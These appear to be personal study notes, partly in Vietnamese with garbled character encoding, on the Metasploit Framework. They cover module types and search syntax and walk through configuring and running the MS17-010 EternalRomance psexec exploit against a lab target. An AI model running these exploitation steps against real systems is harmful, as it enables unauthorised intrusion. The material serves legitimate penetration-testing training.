metasploit 


/usr/share/metasploit-framewok

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

TÃ¬m hiá»ƒu sÆ¡ qua vá» metasploit 

Metasploit Pro : commercial use , paid Subscription, Enterprise 

Metasploit Framework : Open source, Community Driven, Free 

CÃ³ bao nhiÃªu module 
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/modules
    auxiliary  encoders  evasion  exploits  nops  payloads  post

Plguin ? 
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/
    aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb
    alias.rb           komand.rb      pcap_log.rb          sqlmap.rb
    auto_add_route.rb  lab.rb         request.rb           thread.rb
    beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb
    db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb
    db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
    event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
    ffautoregen.rb     nexpose.rb     socket_logger.rb

Plugin trong Metasploit lÃ  cÃ¡c tiá»‡n Ã­ch má»Ÿ rá»™ng báº±ng Ruby, náº¡p báº±ng lá»‡nh load, giÃºp bá»• sung chá»©c nÄƒng vÃ  tá»± Ä‘á»™ng hÃ³a trong msfconsole.
  VÃ­ dá»¥:
    nmap â†’ cháº¡y Nmap trá»±c tiáº¿p trong Metasploit, import káº¿t quáº£.
    session_tagger â†’ tá»± Ä‘á»™ng gáº¯n nhÃ£n cho session.
    event_tagger â†’ log & gáº¯n tháº» sá»± kiá»‡n.
    log â†’ ghi log hoáº¡t Ä‘á»™ng.
    ğŸ‘‰ Hiá»ƒu Ä‘Æ¡n giáº£n: plugin = â€œadd-onâ€ giÃºp msfconsole máº¡nh vÃ  tiá»‡n hÆ¡n.

Script
  Chá»©c nÄƒng Meterpreter vÃ  cÃ¡c script há»¯u Ã­ch khÃ¡c.
    naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/
    meterpreter  ps  resource  shell

Tools
Command-line utilities that can be called directly from the msfconsole menu.
  naruto3co@htb[/htb]$ ls /usr/share/metasploit-framework/tools/
    context  docs     hardware  modules   payloads
    dev      exploit  memdump   password  recon



Make sure you are using the latest version
  naruto3co@htb[/htb]$ sudo apt update && sudo apt install metasploit-framework

The first steps Ã­ to gather information about the target: what it is, which technologies and versions are being used, and whether they have vulnerability . -> we need Enumeration 
MSF engagement structure 

Engagement Structure
â”‚
â”œâ”€â”€ Enumeration
â”‚   â”œâ”€â”€ Service Validation
â”‚   â”‚   â”œâ”€â”€ Passive Scanning
â”‚   â”‚   â”‚   â”œâ”€â”€ OSINT
â”‚   â”‚   â”‚   â”œâ”€â”€ Interacting with services legitimately
â”‚   â”‚   â”‚   â””â”€â”€ Whois / DNS records
â”‚   â”‚   â””â”€â”€ Active Scanning
â”‚   â”‚       â”œâ”€â”€ nMap / Nessus / NexPose scans
â”‚   â”‚       â”œâ”€â”€ Web service identification tools
â”‚   â”‚       â””â”€â”€ Built-with identification tools
â”‚   â””â”€â”€ Vulnerability Research
â”‚       â”œâ”€â”€ VulnDB (GUI)
â”‚       â”œâ”€â”€ Rapid7 (GUI)
â”‚       â”œâ”€â”€ SearchSploit (CLI)
â”‚       â””â”€â”€ Google Dorking (GUI)
â”‚
â”œâ”€â”€ Preparation
â”‚   â”œâ”€â”€ Code Auditing
â”‚   â”œâ”€â”€ Dependency Check
â”‚   â””â”€â”€ Importing Custom Modules
â”‚
â”œâ”€â”€ Exploitation
â”‚   â”œâ”€â”€ Run Module Locally
â”‚   â”œâ”€â”€ Set Parameters
â”‚   â”‚   â”œâ”€â”€ Options (> show options)
â”‚   â”‚   â”‚   â”œâ”€â”€ URI
â”‚   â”‚   â”‚   â”œâ”€â”€ PROXIES
â”‚   â”‚   â”‚   â”œâ”€â”€ RHOST / RPORT
â”‚   â”‚   â”‚   â”œâ”€â”€ USERNAMES / PASSWORDS
â”‚   â”‚   â”‚   â”œâ”€â”€ DICTIONARIES
â”‚   â”‚   â”‚   â””â”€â”€ SESSION
â”‚   â”‚   â”œâ”€â”€ Payloads (> show payloads)
â”‚   â”‚   â”‚   â”œâ”€â”€ METERPRETER
â”‚   â”‚   â”‚   â”œâ”€â”€ SHELL BINDS
â”‚   â”‚   â”‚   â”œâ”€â”€ REVERSE SHELLS
â”‚   â”‚   â”‚   â”œâ”€â”€ EXE
â”‚   â”‚   â”‚   â”œâ”€â”€ LINUX
â”‚   â”‚   â”‚   â”œâ”€â”€ WINDOWS
â”‚   â”‚   â”‚   â”œâ”€â”€ MACOSX
â”‚   â”‚   â”‚   â””â”€â”€ OTHERS
â”‚   â”‚   â””â”€â”€ Targets (> show targets)
â”‚   â”‚       â””â”€â”€ Set target [OS]
â”‚   â””â”€â”€ Run
â”‚
â”œâ”€â”€ Privilege Escalation
â”‚   â”œâ”€â”€ Vulnerability Research
â”‚   â”œâ”€â”€ Credential Gathering
â”‚   â””â”€â”€ Token Impersonation
â”‚
â””â”€â”€ Post-Exploitation
    â”œâ”€â”€ Pivoting to Other Systems
    â”œâ”€â”€ Credential Gathering
    â”œâ”€â”€ Data Exfiltration
    â””â”€â”€ Cleanup

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Once we are in the msfconsole, we can select modules available Metasploit. Each of them is structured into folders, which will look like this 

Syntax
  <No.> <type>/<os>/<service>/<name>
  794   exploit/windows/ftp/scriptftp_list

How many type of "type" 
  Auxiliary: QuÃ©t (scanning), fuzzing, sniffing vÃ  cÃ¡c kháº£ nÄƒng quáº£n trá»‹. Cung cáº¥p há»— trá»£ vÃ  chá»©c nÄƒng bá»• sung.
  Encoders: Äáº£m báº£o payload Ä‘Æ°á»£c giá»¯ nguyÃªn váº¹n khi tá»›i Ä‘Ã­ch.
  Exploits: ÄÆ°á»£c Ä‘á»‹nh nghÄ©a lÃ  cÃ¡c module khai thÃ¡c lá»— há»•ng, cho phÃ©p triá»ƒn khai payload.
  NOPs: (No Operation code) Giá»¯ cho kÃ­ch thÆ°á»›c payload nháº¥t quÃ¡n giá»¯a cÃ¡c láº§n khai thÃ¡c.
  Payloads: Äoáº¡n mÃ£ cháº¡y tá»« xa vÃ  gá»i ngÆ°á»£c vá» mÃ¡y táº¥n cÃ´ng Ä‘á»ƒ thiáº¿t láº­p káº¿t ná»‘i (hoáº·c shell).
  Plugins: CÃ¡c script bá»• sung cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ­ch há»£p trong quÃ¡ trÃ¬nh kiá»ƒm thá»­ vá»›i msfconsole vÃ  cÃ¹ng tá»“n táº¡i.
  Post: Nhiá»u module há»— trá»£ thu tháº­p thÃ´ng tin, má»Ÿ rá»™ng táº¥n cÃ´ng (pivot), vÃ  cÃ¡c hoáº¡t Ä‘á»™ng háº­u khai thÃ¡c khÃ¡c.

Há»‡ Ä‘iá»u hÃ nh
  Tháº» Há»‡ Ä‘iá»u hÃ nh chá»‰ Ä‘á»‹nh há»‡ Ä‘iá»u hÃ nh vÃ  kiáº¿n trÃºc mÃ  mÃ´-Ä‘un Ä‘Æ°á»£c táº¡o ra. Táº¥t nhiÃªn, cÃ¡c há»‡ Ä‘iá»u hÃ nh khÃ¡c nhau yÃªu cáº§u mÃ£ khÃ¡c nhau Ä‘á»ƒ cháº¡y Ä‘á»ƒ cÃ³ Ä‘Æ°á»£c káº¿t quáº£ mong muá»‘n.

Dá»‹ch vá»¥
  Tháº» Dá»‹ch vá»¥ Ä‘á» cáº­p Ä‘áº¿n dá»‹ch vá»¥ dá»… bá»‹ táº¥n cÃ´ng Ä‘ang cháº¡y trÃªn mÃ¡y má»¥c tiÃªu. Äá»‘i vá»›i má»™t sá»‘ mÃ´-Ä‘un, cháº³ng háº¡n nhÆ° mÃ´-Ä‘un phá»¥ trá»£ hoáº·c mÃ´-Ä‘un sau, tháº» nÃ y cÃ³ thá»ƒ Ä‘á» cáº­p Ä‘áº¿n má»™t hoáº¡t Ä‘á»™ng chung hÆ¡n nhÆ° thu tháº­p, vÃ­ dá»¥ nhÆ° thu tháº­p thÃ´ng tin Ä‘Äƒng nháº­p.

TÃªn
  Cuá»‘i cÃ¹ng, tháº» TÃªn giáº£i thÃ­ch hÃ nh Ä‘á»™ng thá»±c táº¿ cÃ³ thá»ƒ Ä‘Æ°á»£c thá»±c hiá»‡n báº±ng mÃ´-Ä‘un nÃ y Ä‘Æ°á»£c táº¡o cho má»™t má»¥c Ä‘Ã­ch cá»¥ thá»ƒ.



Searching for Modules
  msf6 > search eternalromance
  Matching Modules
  ================
  
     #  Name                                  Disclosure Date  Rank    Check  Description
     -  ----                                  ---------------  ----    -----  -----------
     0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     1  auxiliary/admin/smb/ms17_010_command  2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution

  msf6 > search eternalromance type:exploit
  Matching Modules
  ================
     #  Name                                  Disclosure Date  Rank    Check  Description
     -  ----                                  ---------------  ----    -----  -----------
     0  exploit/windows/smb/ms17_010_psexec   2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution


ChÃºng ta cÅ©ng cÃ³ thá»ƒ lÃ m cho tÃ¬m kiáº¿m trá»Ÿ nÃªn tá»•ng quÃ¡t hÆ¡n má»™t chÃºt vÃ  thu háº¹p nÃ³ thÃ nh má»™t danh má»¥c dá»‹ch vá»¥. VÃ­ dá»¥, Ä‘á»‘i vá»›i CVE, chÃºng ta cÃ³ thá»ƒ chá»‰ Ä‘á»‹nh nÄƒm (cve:<year>), ná»n táº£ng Windows (platform:<os>), loáº¡i mÃ´-Ä‘un chÃºng ta muá»‘n tÃ¬m (type:<auxiliary/exploit/post>), thá»© háº¡ng Ä‘á»™ tin cáº­y (rank:<rank>) vÃ  tÃªn tÃ¬m kiáº¿m (<pattern>). Äiá»u nÃ y sáº½ thu háº¹p káº¿t quáº£ tÃ¬m kiáº¿m xuá»‘ng chá»‰ cÃ²n nhá»¯ng káº¿t quáº£ khá»›p vá»›i táº¥t cáº£ cÃ¡c yáº¿u tá»‘ trÃªn.

MSF - Specific Search
  msf6 > search type:exploit platform:windows cve:2021 rank:excellent microsoft
  Matching Modules
  ================
  
     #  Name                                            Disclosure Date  Rank       Check  Description
     -  ----                                            ---------------  ----       -----  -----------
     0  exploit/windows/http/exchange_proxylogon_rce    2021-03-02       excellent  Yes    Microsoft Exchange ProxyLogon RCE
     1  exploit/windows/http/exchange_proxyshell_rce    2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
     2  exploit/windows/http/sharepoint_unsafe_control  2021-05-11       excellent  Yes    Microsoft SharePoint Unsafe Control and ViewState RCE


Module Selection
To select our first module, we first need to find one. Let's suppose that we have a target running a version of SMB vulnerable to EternalRomance (MS17_010) exploits. We have found that SMB server port 445 is open upon scanning the target.
  naruto3co@htb[/htb]$ nmap -sV 10.10.10.40
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-13 21:38 UTC
    Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
    Nmap scan report for 10.10.10.40
    Host is up (0.051s latency).
    Not shown: 991 closed ports
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49156/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  msrpc        Microsoft Windows RPC
    Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 60.87 seconds

LÆ°u Ã½ á»Ÿ Ä‘Ã¢y lÃ  : Port 445 má»Ÿ, Ä‘Ã¢y lÃ  SMB service, thÆ°á»ng liÃªn quan Ä‘áº¿n cÃ¡c lá»— há»•ng ná»•i tiáº¿ng nhÆ° MS17-010 (EternalBlue, EternalRomance, EternalChampion, â€¦). => tÃ¬m cÃ¡c lá»— há»•ng liÃªn quan trÃªn msfconsole 

  msf6 > search ms17_010
  Matching Modules
  ================
     #  Name                                      Disclosure Date  Rank     Check  Description
     -  ----                                      ---------------  ----     -----  -----------
     0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
     2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
     3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection

Tiáº¿p theo, chá»n module phÃ¹ há»£p. tháº¥y ráº±ng nmap nháº­n Ä‘á»‹nh Ä‘Ã¢y lÃ  windows 7 Ä‘áº¿n 10 

Sá»­ dá»¥ng module
  msf6 > use 0
  msf6 exploit(windows/smb/ms17_010_psexec) > options
  Module options (exploit/windows/smb/ms17_010_psexec): 
     Name                  Current Setting                          Required  Description
     ----                  ---------------                          --------  -----------
     DBGTRACE              false                                    yes       Show extra debug trace info
     LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
     NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
     NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                           rdlists/named_pipes.txt
     RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                              /wiki/Using-Metasploit
     RPORT                 445                                      yes       The Target port (TCP)
     SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
     SERVICE_DISPLAY_NAME                                           no        The service display name
     SERVICE_NAME                                                   no        The service name
     SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                              rmal read/write folder share
     SMBDomain             .                                        no        The Windows domain to use for authentication
     SMBPass                                                        no        The password for the specified username
     SMBUser                                                        no        The username to authenticate as
  Payload options (windows/meterpreter/reverse_tcp):
     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------
     EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
     LHOST                      yes       The listen address (an interface may be specified)
     LPORT     4444             yes       The listen port
  Exploit target:
     Id  Name
     --  ----
     0   Automatic

Ta tháº¥y tháº» No. ráº¥t helpful , chá»‰ cáº§n nháº­p sá»‘ cá»§a nÃ³ thay vÃ¬ nháº­p tÃªn cáº£ module 
Chá»n module xong rá»“i thÃ¬ ta cÃ³ thá»ƒ xem thÃ´ng tin cá»§a module Ä‘Ã³
  msf6 exploit(windows/smb/ms17_010_psexec) > info
         Name: MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
       Module: exploit/windows/smb/ms17_010_psexec
     Platform: Windows
         Arch: x86, x64
   Privileged: No
      License: Metasploit Framework License (BSD)
         Rank: Normal
    Disclosed: 2017-03-14
  Provided by:
    sleepya
    zerosum0x0
    Shadow Brokers
    Equation Group
  Available targets:
    Id  Name
    --  ----
    0   Automatic
    1   PowerShell
    2   Native upload
    3   MOF upload
  Check supported:
    Yes
  Basic options:
    Name                  Current Setting                          Required  Description
    ----                  ---------------                          --------  -----------
    DBGTRACE              false                                    yes       Show extra debug trace info
    LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
    NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
    NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                          rdlists/named_pipes.txt
    RHOSTS                                                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                                                             wiki/Using-Metasploit
    RPORT                 445                                      yes       The Target port (TCP)
    SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
    SERVICE_DISPLAY_NAME                                           no        The service display name
    SERVICE_NAME                                                   no        The service name
    SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a nor
                                                                             mal read/write folder share
    SMBDomain             .                                        no        The Windows domain to use for authentication
    SMBPass                                                        no        The password for the specified username
    SMBUser                                                        no        The username to authenticate as
  Payload information:
    Space: 3072
  Description:
    This module will exploit SMB with vulnerabilities in MS17-010 to 
    achieve a write-what-where primitive. This will then be used to 
    overwrite the connection session information with as an 
    Administrator session. From there, the normal psexec payload code 
    execution is done. Exploits a type confusion between Transaction and 
    WriteAndX requests and a race condition in Transaction requests, as 
    seen in the EternalRomance, EternalChampion, and EternalSynergy 
    exploits. This exploit chain is more reliable than the EternalBlue 
    exploit, but requires a named pipe.
  References:
    https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
    https://nvd.nist.gov/vuln/detail/CVE-2017-0143
    https://nvd.nist.gov/vuln/detail/CVE-2017-0146
    https://nvd.nist.gov/vuln/detail/CVE-2017-0147
    https://github.com/worawit/MS17-010
    https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf
    https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/
  Also known as:
    ETERNALSYNERGY
    ETERNALROMANCE
    ETERNALCHAMPION
    ETERNALBLUE

Chá»— nÃ y quan tÃ¢m má»—i basic Option nhÃ© ae. chá»— nÃ o required lÃ  YES thÃ¬ ae cáº§n Ä‘iá»n nhÃ© 

Modules
  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
    RHOSTS => 10.10.10.40

  msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 10.10.10.40
  RHOSTS => 10.10.10.40

Once everything is set and ready to go, we can proceed to launch the attack. Note that the payload was not set here, as the default one is sufficient for this demonstration.

  msf6 exploit(windows/smb/ms17_010_psexec) > run

TÃ´i thÆ°á»ng dÃ¹ng msf6 >check Ä‘á»ƒ kiá»ƒm tra trÆ°á»›c khi >run Ä‘Ã³ 
  exploit(windows/smb/ms17_010_psexec) > check


DÃ¹ng show target khi nÃ o 
  msf6 > use exploit/windows/smb/ms17_010_psexec
  msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets
  
  Exploit targets: 
     Id  Name
     --  ----
     0   Automatic
     1   IE 7 on Windows XP SP3
     2   IE 8 on Windows XP SP3
     3   IE 7 on Windows Vista
     4   IE 8 on Windows Vista
     5   IE 8 on Windows 7
     6   IE 9 on Windows 7

show targets chÃ¨n ngay sau khi chá»n exploit, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh OS nÃ o sáº½ khai thÃ¡c.
Táº¡i sao pháº£i chá»n target trong khi msfconsole cÃ³ kháº£ nÄƒng tá»± Ä‘á»™ng tÃ¬m Ä‘Æ°á»£c. Giáº£m khÃ¡ nÄƒng crash, giáº£m thá»i gian, pháº¡m vi sá»­ dá»¥ng metasploit 






//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
Frist time, you need search keyword 
  searchsploit openssh 7.2

Open metasploit 
  msfconsole

Search modules exploit 
  search exploit CVE-XXXX-XXXX

Use module 
  use 0     // can be use ordinal or module name
  use exploit/windows/smb/ms17_010_psexec

What option we need ? 
  show options

How to setup ? when you know options you need config 
  set RHOSTS 10.10.10.40
  set LHOST tun0

We done ? yes. In the final step, you need to exploit
But you need to check that to ensure sever is vulnerable 
  check

Ok final 
  exploit 






